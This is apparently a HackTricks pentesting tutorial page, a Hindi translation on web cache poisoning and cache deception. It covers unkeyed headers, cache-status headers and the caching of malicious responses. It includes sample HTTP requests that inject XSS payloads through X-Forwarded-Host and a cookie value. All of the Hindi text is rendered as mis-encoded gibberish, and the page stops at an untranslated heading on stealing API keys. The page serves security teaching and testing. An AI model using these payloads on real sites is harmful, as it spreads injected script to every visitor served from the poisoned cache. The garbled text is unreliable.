# рдХреИрд╢ рдкреЙрдЗрдЬрд╝рдирд┐рдВрдЧ рдФрд░ рдХреИрд╢ рдзреЛрдЦрд╛рдзрдбрд╝реА

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд рд╣реЛ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рди**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@carlospolopm**](https://twitter.com/hacktricks\_live)** рдкрд░ рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВред

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ рдФрд░ **рджреБрдирд┐рдпрд╛ рдХреЗ рд╕рдмрд╕реЗ рдЙрдиреНрдирдд рд╕рдореБрджрд╛рдп рдЙрдкрдХрд░рдгреЛрдВ рджреНрд╡рд╛рд░рд╛ рд╕рдВрдЪрд╛рд▓рд┐рдд** **рд╡рд░реНрдХрдлрд╝реНрд▓реЛ** рдЖрд╕рд╛рдиреА рд╕реЗ рдмрдирд╛рдПрдВ рдФрд░ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдХрд░реЗрдВред\
рдЖрдЬ рд╣реА рдкрд╣реБрдВрдЪреЗрдВ:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## рдЕрдВрддрд░

> **рд╡реЗрдм рдХреИрд╢ рдкреЙрдЗрдЬрд╝рдирд┐рдВрдЧ рдФрд░ рд╡реЗрдм рдХреИрд╢ рдзреЛрдЦрд╛рдзрдбрд╝реА рдХреЗ рдмреАрдЪ рдЕрдВрддрд░ рдХреНрдпрд╛ рд╣реИ?**
>
> * **рд╡реЗрдм рдХреИрд╢ рдкреЙрдЗрдЬрд╝рдирд┐рдВрдЧ** рдореЗрдВ, рд╣рдорд▓рд╛рд╡рд░ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ рдХреИрд╢ рдореЗрдВ рдХреБрдЫ рджреБрд░реНрднрд╛рдЧреНрдпрдкреВрд░реНрдг рд╕рд╛рдордЧреНрд░реА рд╕реНрдЯреЛрд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдордЬрдмреВрд░ рдХрд░рддрд╛ рд╣реИ, рдФрд░ рдпрд╣ рд╕рд╛рдордЧреНрд░реА рдХреИрд╢ рд╕реЗ рдЕрдиреНрдп рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рдкреНрд░рджрд╛рди рдХреА рдЬрд╛рддреА рд╣реИред
> * **рд╡реЗрдм рдХреИрд╢ рдзреЛрдЦрд╛рдзрдбрд╝реА** рдореЗрдВ, рд╣рдорд▓рд╛рд╡рд░ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ рдХрд┐рд╕реА рдЕрдиреНрдп рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреА рдХреБрдЫ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рд╕рд╛рдордЧреНрд░реА рдХреЛ рдХреИрд╢ рдореЗрдВ рд╕реНрдЯреЛрд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдордЬрдмреВрд░ рдХрд░рддрд╛ рд╣реИ, рдФрд░ рдлрд┐рд░ рд╣рдорд▓рд╛рд╡рд░ рдЗрд╕ рд╕рд╛рдордЧреНрд░реА рдХреЛ рдХреИрд╢ рд╕реЗ рдкреБрдирдГ рдкреНрд░рд╛рдкреНрдд рдХрд░рддрд╛ рд╣реИред

## рдХреИрд╢ рдкреЙрдЗрдЬрд╝рдирд┐рдВрдЧ

рдХреИрд╢ рдкреЙрдЗрдЬрд╝рдирд┐рдВрдЧ рдХрд╛ рдЙрджреНрджреЗрд╢реНрдп рдХреНрд▓рд╛рдЗрдВрдЯ-рд╕рд╛рдЗрдб рдХреИрд╢ рдХреЛ рдорд╛рдирд╡реАрдп рдмрд╛рдзрд┐рдд, рдЕрдкреНрд░рддреНрдпрд╛рд╢рд┐рдд, рдпрд╛ рд╣рдорд▓рд╛рд╡рд░ рдХреЗ рдирд┐рдпрдВрддреНрд░рдг рдореЗрдВ рд░рд╣рдиреЗ рд╡рд╛рд▓реЗ рд╕рдВрд╕рд╛рдзрдиреЛрдВ рдХреЛ рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХреНрд▓рд╛рдЗрдВрдЯреНрд╕ рдХреЛ рдордЬрдмреВрд░ рдХрд░рдирд╛ рд╣реИред рдкреНрд░рднрд╛рд╡ рдХреА рд╡реНрдпрд╛рдкреНрддрд┐ рдкреНрд░рднрд╛рд╡рд┐рдд рдкреГрд╖реНрда рдХреА рд▓реЛрдХрдкреНрд░рд┐рдпрддрд╛ рдкрд░ рдирд┐рд░реНрднрд░ рд╣реИ, рдХреНрдпреЛрдВрдХрд┐ рджреВрд╖рд┐рдд рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХреЗрд╡рд▓ рдХреИрд╢ рдХреЗ рдкреНрд░рджреВрд╖рд┐рдд рд╣реЛрдиреЗ рдХреЗ рдЕрд╡рдзрд┐ рдХреЗ рджреМрд░рд╛рди рдкреГрд╖реНрда рдХрд╛ рджреМрд░рд╛ рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рдкреНрд░рджрд╛рди рдХреА рдЬрд╛рддреА рд╣реИред

рдХреИрд╢ рдкреЙрдЗрдЬрд╝рдирд┐рдВрдЧ рд╣рдорд▓реЗ рдХрд╛ рдХрд╛рд░реНрдпрд╛рдиреНрд╡рдпрди рдХрдИ рдЪрд░рдгреЛрдВ рдореЗрдВ рд╣реЛрддрд╛ рд╣реИ:

1. **рдЕрдХреА рдЧрдИ рдЗрдирдкреБрдЯреНрд╕ рдХреА рдкрд╣рдЪрд╛рди**: рдпреЗ рдкреИрд░рд╛рдореАрдЯрд░ рд╣реИрдВ рдЬреЛ, рдпрджреНрдпрдкрд┐ рдХреИрд╢ рдХреЗ рд▓рд┐рдП рдПрдХ рдЕрдиреБрд░реЛрдз рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реИ, рд╕рд░реНрд╡рд░ рджреНрд╡рд╛рд░рд╛ рд╡рд╛рдкрд╕ рдЖрдП рдЬрд╡рд╛рдм рдХреЛ рдмрджрд▓ рд╕рдХрддреЗ рд╣реИрдВред рдЗрдирдкреБрдЯреНрд╕ рдХреА рдкрд╣рдЪрд╛рди рдХрд░рдирд╛ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдЗрдиреНрд╣реЗрдВ рдХреИрд╢ рдХреЛ рдорд╛рдирд┐рдкреБрд▓реЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред
2. **рдЕрдХреА рдЧрдИ рдЗрдирдкреБрдЯреНрд╕ рдХрд╛ рд╢реЛрд╖рдг**: рдЕрдХреА рдЧрдИ рдЗрдирдкреБрдЯреНрд╕ рдХреА рдкрд╣рдЪрд╛рди рдХреЗ рдмрд╛рдж, рдЕрдЧрд▓рд╛ рдХрджрдо рдпрд╣ рд╣реИ рдХрд┐ рд╣рдореЗрдВ рдпрд╣ рддрдп рдХрд░рдирд╛ рд╣реИ рдХрд┐ рдЗрди рдкреИрд░рд╛рдореАрдЯрд░реЛрдВ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХреИрд╕реЗ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рддрд╛рдХрд┐ рд╣рдорд▓рд╛рд╡рд░ рдХреЛ рд▓рд╛рдн рдкрд╣реБрдВрдЪрд╛рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рд░реНрд╡рд░ рдХреА рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред
3. **рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рдирд╛ рдХрд┐ рдкреЙрдЗрдЬрд╝рдиреНрдб рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХреИрд╢ рдореЗрдВ рд╕реНрдЯреЛрд░ рд╣реИ**: рдЕрдВрддрд┐рдо рдХрджрдо рдпрд╣ рд╣реИ рдХрд┐ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдП рдХрд┐ рд╕рдВрд╢реЛрдзрд┐рдд рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХреЛ рдХреИрд╢ рдореЗрдВ рд╕реНрдЯреЛрд░ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред рдЗрд╕ рддрд░рд╣, рдХреИрд╢ рдкреНрд░рджреВрд╖рд┐рдд рд╣реЛрдиреЗ рдХреЗ рджреМрд░рд╛рди рдкреНрд░рднрд╛рд╡рд┐рдд рдкреГрд╖реНрда рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рд╡рд╛рд▓реЗ рдХрд┐рд╕реА рднреА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рджреВрд╖рд┐рдд рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдкреНрд░рд╛рдкреНрдд рд╣реЛрдЧреАред

### рдЦреЛрдЬ: HTTP рд╣реЗрдбрд░реНрд╕ рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ

рд╕рд╛рдорд╛рдиреНрдпрдд: рдЬрдм рдПрдХ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ **рдХреИрд╢ рдореЗрдВ рд╕реНрдЯреЛрд░ рдХреА рдЧрдИ рдереА** рддреЛ рдПрдХ **рд╣реЗрдбрд░ рдЗрд╕рдХрд╛ рд╕рдВрдХреЗрдд рджреЗрдЧрд╛**, рдЖрдк рдЗрд╕ рдкреЛрд╕реНрдЯ рдореЗрдВ рдзреНрдпрд╛рди рджреЗрдиреЗ рдпреЛрдЧреНрдп рд╣реЗрдбрд░реНрд╕ рдХреА рдЬрд╛рдВрдЪ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ: [**HTTP рдХреИрд╢ рд╣реЗрдбрд░реНрд╕**](../network-services-pentesting/pentesting-web/special-http-headers.md#cache-headers)ред

### рдЦреЛрдЬ: рдХреИрд╢рд┐рдВрдЧ 400 рдХреЛрдб

рдпрджрд┐ рдЖрдк рд╕реЛрдЪ рд░рд╣реЗ рд╣реИрдВ рдХрд┐ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХреЛ рдХреИрд╢ рдореЗрдВ рд╕реНрдЯреЛрд░ рдХрд┐рдпрд╛ рдЬрд╛ рд░рд╣рд╛ рд╣реИ, рддреЛ рдЖрдк **рдПрдХ рдмреБрд░рд╛ рд╣реЗрдбрд░ рднреЗрдЬрдиреЗ** рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдЬрд┐рд╕реЗ рдПрдХ **рд╕реНрдерд┐рддрд┐ рдХреЛрдб 400** рдХреЗ рд╕рд╛рде рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рджреА рдЬрд╛рдиреА рдЪрд╛рд╣рд┐рдПред рдлрд┐рд░ рд╕рд╛рдорд╛рдиреНрдп рд░реВрдк рд╕реЗ рдЕрдиреБрд░реЛрдз рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░реЗрдВ рдФрд░ рдпрджрд┐ **рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ 400 рд╕реНрдерд┐рддрд┐ рдХреЛрдб рд╣реИ**, рддреЛ рдЖрдк рдЬрд╛рди рдЬрд╛рддреЗ рд╣реИрдВ рдХрд┐ рдпрд╣ рд╡рдВрд▓реНрдирд░реЗрдмрд▓ рд╣реИ (рдФрд░ рдЖрдк рдПрдХ рдбреАрдУрдПрд╕ рднреА рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ)ред\
рдПрдХ рдЦрд░рд╛рдмреА рд╕реЗ рдпреБрдХреНрдд рд╣реЗрдбрд░ рдмрд╕ `\:` рд╣реЛ рд╕рдХрддрд╛ рд╣реИред\
_рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдХрднреА-рдХрднреА рдЗрди рдкреНрд░рдХрд╛рд░ рдХреЗ рд╕реНрдерд┐рддрд┐ рдХреЛрдб рдХреИрд╢ рдирд╣реАрдВ рд╣реЛрддреЗ рд╣реИрдВ, рдЗрд╕рд▓рд┐рдП рдпрд╣ рдкрд░реАрдХреНрд╖рдг рдЕрдлрд╝рд╛рд▓ рд╣реЛрдЧрд╛ред_

### рдЦреЛрдЬ: рдЕрдХреА рдЧрдИ рдЗрдирдкреБрдЯреНрд╕ рдХреА рдкрд╣рдЪрд╛рди рдФрд░ рдореВрд▓реНрдпрд╛рдВрдХрди рдХрд░реЗрдВ

рдЖрдк [**рдкреИрд░рд╛рдо рдорд╛рдЗрдирд░**](https://portswigger.net/bappstore/17d2949a985c4b7ca092728dba871943) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рдЖрдк рдкреГрд╖реНрда рдХреА рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХреЛ рдмрджрд▓рдиреЗ рд╡рд╛рд▓реЗ рдкреИрд░рд╛рдореАрдЯрд░ рдФрд░ рд╣реЗрдбрд░реНрд╕ рдХреЛ **рдмреНрд░реВрдЯ-рдлрд╝реЛрд░реНрд╕** рдХрд░ рд╕рдХреЗрдВред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдПрдХ рдкреГрд╖реНрда `X-Forwarded-For` рд╣реЗрдбрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддрд╛ рд╣реИ рддрд╛рдХрд┐ рдХреНрд▓рд╛рдЗрдВрдЯ рдХреЛ рд╡рд╣рд╛рдБ рд╕реЗ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реВрдЪрд┐рдд рдХрд░реЗрдВ:
```markup
<script type="text/javascript" src="//<X-Forwarded-For_value>/resources/js/tracking.js"></script>
```
### рдкреАрдЫреЗ-рдПрдВрдб рд╕рд░реНрд╡рд░ рд╕реЗ рдПрдХ рд╣рд╛рдирд┐рдХрд╛рд░рдХ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ

рдкреИрд░рд╛рдореАрдЯрд░/рд╣реЗрдбрд░ рдХреЛ рдкрд╣рдЪрд╛рдирдиреЗ рдХреЗ рд╕рд╛рде рдЬрд╛рдВрдЪреЗрдВ рдХрд┐ рдпрд╣ **рдХреИрд╕реЗ рд╕реИрдирд┐рдЯрд╛рдЗрдЬрд╝** рдХрд┐рдпрд╛ рдЬрд╛ рд░рд╣рд╛ рд╣реИ рдФрд░ рдпрд╣ **рдХрд╣рд╛рдБ рдкрд░рд┐рдЪрд┐рдд** рд╣реЛ рд░рд╣рд╛ рд╣реИ рдпрд╛ рд╣реЗрдбрд░ рд╕реЗ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдкрд░ рдкреНрд░рднрд╛рд╡ рдбрд╛рд▓ рд░рд╣рд╛ рд╣реИред рдХреНрдпрд╛ рдЖрдк рдЗрд╕реЗ рдХрд┐рд╕реА рднреА рддрд░рд╣ рд╕реЗ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ (рдПрдХ XSS рдХрд╛рд░реНрдпрд╛рдиреНрд╡рд┐рдд рдХрд░реЗрдВ рдпрд╛ рдЖрдкрдХреЗ рджреНрд╡рд╛рд░рд╛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдЬреЗрдПрд╕ рдХреЛрдб рд▓реЛрдб рдХрд░реЗрдВ? рдбреЛрдПрд╕ рдХрд╛рд░реНрдпрд╛рдиреНрд╡рд┐рдд рдХрд░реЗрдВ?...)

### рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХреЛ рдХреИрд╢ рдХрд░реЗрдВ

рдЬрдм рдЖрдкрдиреЗ рдЙрд╕ рдкреГрд╖реНрда рдХреЛ рдкрд╣рдЪрд╛рди рд▓рд┐рдпрд╛ рд╣реИ рдЬрд┐рд╕реЗ рджреБрд░реБрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдХрд┐рд╕ рдкреИрд░рд╛рдореАрдЯрд░/рд╣реЗрдбрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рд╣реИ рдФрд░ рдЗрд╕реЗ рдХреИрд╕реЗ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдирд╛ рд╣реИ, рддреЛ рдЖрдкрдХреЛ рдкреГрд╖реНрда рдХреЛ рдХреИрд╢ рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИред рдХреИрд╢ рдореЗрдВ рдбрд╛рд▓рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░рдиреЗ рдкрд░ рдЗрд╕рдореЗрдВ рдХреБрдЫ рд╕рдордп рд▓рдЧ рд╕рдХрддрд╛ рд╣реИ, рдЖрдкрдХреЛ рдХрдИ рд╕реЗрдХрдВрдб рдХреЗ рд▓рд┐рдП рдкреНрд░рдпрд╛рд╕ рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛ рд╕рдХрддреА рд╣реИред\
рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдореЗрдВ рд╣реЗрдбрд░ **`X-Cache`** рдмрд╣реБрдд рдЙрдкрдпреЛрдЧреА рд╣реЛ рд╕рдХрддрд╛ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ рдорд╛рди **`miss`** рд╣реЛ рд╕рдХрддрд╛ рд╣реИ рдЬрдм рдЕрдиреБрд░реЛрдз рдХреЛ рдХреИрд╢ рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ рдФрд░ рдорд╛рди **`hit`** рд╣реЛ рд╕рдХрддрд╛ рд╣реИ рдЬрдм рдпрд╣ рдХреИрд╢ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред\
рд╣реЗрдбрд░ **`Cache-Control`** рднреА рджрд┐рд▓рдЪрд╕реНрдк рд╣реИ рддрд╛рдХрд┐ рдкрддрд╛ рдЪрд▓реЗ рдХрд┐ рдХреНрдпрд╛ рдХреЛрдИ рд╕рдВрд╕рд╛рдзрди рдХреИрд╢ рд╣реЛ рд░рд╣рд╛ рд╣реИ рдФрд░ рдЕрдЧрд▓реА рдмрд╛рд░ рд╕рдВрд╕рд╛рдзрди рдХреЛ рдлрд┐рд░ рд╕реЗ рдХреИрд╢ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛: `Cache-Control: public, max-age=1800`\
рдПрдХ рдФрд░ рджрд┐рд▓рдЪрд╕реНрдк рд╣реЗрдбрд░ **`Vary`** рд╣реИред рдпрд╣ рд╣реЗрдбрд░ рдЕрдХреНрд╕рд░ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рдЕрддрд┐рд░рд┐рдХреНрдд рд╣реЗрдбрд░ рд╢рд╛рдорд┐рд▓ рд╣реЛрддреЗ рд╣реИрдВ рдЬреЛ рд╕рд╛рдорд╛рдиреНрдп рд░реВрдк рд╕реЗ рдЕрдирдХреА рдЬрд╛рддреА рд╣реИрдВ рдФрд░ рдпрджрд┐ рдЙрдиреНрд╣реЗрдВ рдЪрд╛рдмреА рдХреЗ рд░реВрдк рдореЗрдВ рджреЗрдЦрд╛ рдЬрд╛рддрд╛ рд╣реИ рддреЛ рд╡реЗ рдХреИрд╢ рдХреЗ рдХреБрдВрдЬреА рдХрд╛ рд╣рд┐рд╕реНрд╕рд╛ рдорд╛рдиреЗ рдЬрд╛рддреЗ рд╣реИрдВред рдЗрд╕рд▓рд┐рдП, рдпрджрд┐ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЙрд╕ рд╢рд┐рдХрд╛рд░ рдХрд╛ `User-Agent` рдЬрд╛рдирддрд╛ рд╣реИ рдЬрд┐рд╕реЗ рд╡рд╣ рд▓рдХреНрд╖рд┐рдд рдХрд░ рд░рд╣рд╛ рд╣реИ, рддреЛ рд╡рд╣ рдЙрд╕ рд╡рд┐рд╢реЗрд╖ `User-Agent` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЗ рд▓рд┐рдП рдХреИрд╢ рдХреЛ рджреБрд╖рд┐рдд рдХрд░ рд╕рдХрддрд╛ рд╣реИред\
рдХреИрд╢ рд╕реЗ рд╕рдВрдмрдВрдзрд┐рдд рдПрдХ рдФрд░ рд╣реЗрдбрд░ **`Age`** рд╣реИред рдпрд╣ рдкреНрд░реЙрдХреНрд╕реА рдХреИрд╢ рдореЗрдВ рд╡рд╕реНрддреБ рдХрд┐рддрдиреЗ рд╕реЗрдХрдВрдб рдореЗрдВ рд░рд╣реА рд╣реИ рдпрд╣ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХрд░рддрд╛ рд╣реИред

рдПрдХ рдЕрдиреБрд░реЛрдз рдХреЛ рдХреИрд╢ рдХрд░рддреЗ рд╕рдордп, рд╕рд╛рд╡рдзрд╛рди рд░рд╣реЗрдВ рдХрд┐ рдЖрдк рдХреМрди рд╕реЗ рд╣реЗрдбрд░реНрд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд░рд╣реЗ рд╣реИрдВ рдХреНрдпреЛрдВрдХрд┐ рдЗрдирдореЗрдВ рд╕реЗ рдХреБрдЫ рдЕрдкреНрд░рддреНрдпрд╛рд╢рд┐рдд рд░реВрдк рд╕реЗ рдЪрд╛рдмреА рдХреЗ рд░реВрдк рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдкреАрдбрд╝рд┐рдд рдХреЛ рдЙрд╕реА рд╣реЗрдбрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рд╣реЛрдЧрд╛ред рд╣рдореЗрд╢рд╛ рдпрд╣ рдЬрд╛рдВрдЪреЗрдВ рдХрд┐ рдХреНрдпрд╛ рдХреИрд╢ рдкреЙрдЗрдЬрд╝рдирд┐рдВрдЧ рдХрд╛рдо рдХрд░ рд░рд╣реА рд╣реИ рдпрд╛ рдирд╣реАрдВ, рд╡рд┐рднрд┐рдиреНрди рдмреНрд░рд╛рдЙрдЬрд╝рд░реНрд╕ рдХреЗ рд╕рд╛рдеред

## рд╢реЛрд╖рдг рдЙрджрд╛рд╣рд░рдг

### рд╕рдмрд╕реЗ рдЖрд╕рд╛рди рдЙрджрд╛рд╣рд░рдг

рдЬреИрд╕реЗ `X-Forwarded-For` рдЬреИрд╕рд╛ рд╣реЗрдбрд░ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдореЗрдВ рдЕрд╕реИрдирд┐рдЯрд╛рдЗрдЬрд╝ рдХрд┐рдпрд╛ рдЬрд╛ рд░рд╣рд╛ рд╣реИред\
рдЖрдк рдПрдХ рдореВрд▓ XSS рдкреЗрдпрд▓реЛрдб рднреЗрдЬ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдХреИрд╢ рдХреЛ рджреБрд╖рд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рдкреГрд╖реНрда рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рд╕рднреА рд▓реЛрдЧ XSS рд╣реЛ рдЬрд╛рдПрдВрдЧреЗ:
```markup
GET /en?region=uk HTTP/1.1
Host: innocent-website.com
X-Forwarded-Host: a."><script>alert(1)</script>"
```
### рд╡реЗрдм рдХреИрд╢ рдзреЛрдЦрд╛рдзрдбрд╝реА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХреБрдХреА-рд╣реИрдВрдбрд▓рд┐рдВрдЧ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдирд╛

рдХреБрдХреА рдПрдХ рдкреГрд╖реНрда рдХреЗ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдкрд░ рдкреНрд░рддрд┐рдмрд┐рдореНрдмрд┐рдд рд╣реЛ рд╕рдХрддреА рд╣реИред рдпрджрд┐ рдЖрдк рдЗрд╕реЗ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ XSS рдХрд╛ рдХрд╛рд░рдг рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ, рддреЛ рдЖрдк рдХрдИ рдХреНрд▓рд╛рдЗрдВрдЯреНрд╕ рдореЗрдВ XSS рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ рджреБрд░реНрднрд╛рдЧреНрдпрдкреВрд░реНрдг рдХреИрд╢ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рд▓реЛрдб рдХрд░рддреЗ рд╣реИрдВред
```markup
GET / HTTP/1.1
Host: vulnerable.com
Cookie: session=VftzO7ZtiBj5zNLRAuFpXpSQLjS4lBmU; fehost=asd"%2balert(1)%2b"
```
### Cache poisoning with path traversal to steal API key <a href="#using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities" id="using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities"></a>

